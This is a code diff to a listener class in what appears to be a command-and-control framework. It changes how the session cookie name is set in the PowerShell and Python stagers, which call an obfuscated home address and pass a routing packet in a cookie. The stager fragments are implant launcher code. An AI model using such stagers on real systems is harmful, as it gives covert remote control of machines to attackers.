@@ -63,8 +63,8 @@ class Listener:
             },
             "Cookie": {
                 "Description": "Custom Cookie Name",
-                "Required": False,
-                "Value": "",
+                "Required": True,
+                "Value": "session",
             },
             "RoutingPacket": {
                 "Description": "Routing packet from the targeted listener",
@@ -119,13 +119,8 @@ class Listener:
             data_util.get_config("staging_key")[0]
         )
 
-        self.session_cookie = ""
+        self.session_cookie = self.options["Cookie"]["Value"]
         self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
-
-        # check if the current session cookie not empty and then generate random cookie
-        if self.session_cookie == "":
-            self.options["Cookie"]["Value"] = listener_util.generate_cookie()
-
         self.instance_log = log
 
     def default_response(self):
@@ -183,6 +178,7 @@ class Listener:
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
         customHeaders = profile.split("|")[2:]
+        cookie = listenerOptions["Cookie"]["Value"]
 
         if language.startswith("po"):
             # PowerShell
@@ -248,7 +244,7 @@ class Listener:
             b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
             # add the routing packet to a cookie
-            stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
+            stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'
 
             stager += (
                 f"$ser= {helpers.obfuscate_call_home_address(host)};$t='{stage0}';"
@@ -304,7 +300,7 @@ class Listener:
             b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
             # add the routing packet to a cookie
-            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={b64RoutingPacket}")];\n'
+            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
             launcherBase += "import urllib.request;\n"
 
             if proxy.lower() != "none":
